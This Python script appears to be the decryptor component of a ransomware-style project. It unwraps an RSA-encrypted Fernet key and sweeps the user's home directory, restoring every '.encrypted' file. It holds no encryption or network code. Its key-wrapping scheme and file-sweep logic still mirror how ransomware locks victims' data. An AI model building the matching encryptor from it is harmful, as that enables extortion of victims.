import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_private_key
from cryptography.fernet import Fernet
from utils import get_script_directory, get_home_directory, iterator

def decrypt_fernet_key_with_rsa(encrypted_fernet_key, private_key_path):
    with open(private_key_path, "rb") as key_file:
        private_key = load_pem_private_key(key_file.read(), password=None)

    fernet_key = private_key.decrypt(
        encrypted_fernet_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return fernet_key

def decrypt_file(file_path, fernet):
    if not  file_path.endswith('.encrypted'):
        print(f"File not encrypted: {file_path}")
        return
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    try:
        decrypt_data = fernet.decrypt(encrypted_data)
        decrypted_file_path = file_path[:-10]
        with open(decrypted_file_path, 'wb') as file:
            file.write(decrypt_data)
        print(f"Archive decrypted: {decrypted_file_path}")
    except Exception as e:
        print(f'Erro on decrypted process {file_path}: {e}')

def main():
    # keys directory
    keys_dir = os.path.join(get_script_directory(), 'keys')

    # Path to keys
    private_key_path = os.path.join(keys_dir, 'private_key.pem')
    encrypted_fernet_key_path = os.path.join(keys_dir, 'encrypted_fernet_key.bin')

    # Read Fernet encrypted key
    with open(encrypted_fernet_key_path, 'rb') as f:
        encrypted_fornet_key = f.read()

    # Decrypting Fernet key
    decrypted_fernet_key = decrypt_fernet_key_with_rsa(encrypted_fornet_key, private_key_path)
    decryption_fernet = Fernet(decrypted_fernet_key)

    # Geting home directory
    system_root = get_home_directory()

    # Linting encrypted files
    files_to_decrypt = iterator(system_root, exclude_dirs=[keys_dir, get_script_directory()], allowed_extensions=['.encrypted'])

    # Decrypting files
    for file_path in files_to_decrypt:
        decrypt_file(file_path, decryption_fernet)

    print("Finish !")

if __name__ == '__main__':
    main()